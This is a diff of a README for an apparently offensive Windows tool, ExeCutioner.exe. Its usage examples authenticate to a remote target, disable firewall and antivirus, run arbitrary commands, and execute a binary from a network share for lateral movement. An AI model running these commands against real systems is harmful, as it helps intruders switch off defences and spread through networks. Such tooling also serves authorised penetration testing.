@@ -36,14 +36,14 @@ ExeCutioner.exe /?  - show's this help menu
 //Authenticate to target with username and password and disable firewall profiles
 ExeCutioner.exe /t <target name or IP> /user <username> /pass <password> /domain <domain> /nofw true
 
-//Authenticate to target with current system token and turn off av
-ExeCutioner.exe /t <target name or IP> /user <username> /pass <password> /syscreds true /nofw true
+//Authenticate to target with current user token and turn off av
+ExeCutioner.exe /t <target name or IP> /syscreds true /nofw true
 
-//Authenticate to target with current system token and execute command
-ExeCutioner.exe /t <target name or IP> /user <username> /pass <password> /cmd <command-to-run-in-qoutes>
+//Authenticate to target with current user token and execute command
+ExeCutioner.exe /t <target name or IP> /cmd <command-to-run-in-qoutes>
 
-//Authenticate to target with current system token and execute binary for lateral movement
-ExeCutioner.exe /t <target name or IP> /user <username> /pass <password> /cmd <\\192.168.10.8\\lateralmovement.exe>
+//Authenticate to target with current user token and execute binary for lateral movement
+ExeCutioner.exe /t <target name or IP> /cmd <\\192.168.10.8\\lateralmovement.exe>
 ```
 
 # Credits
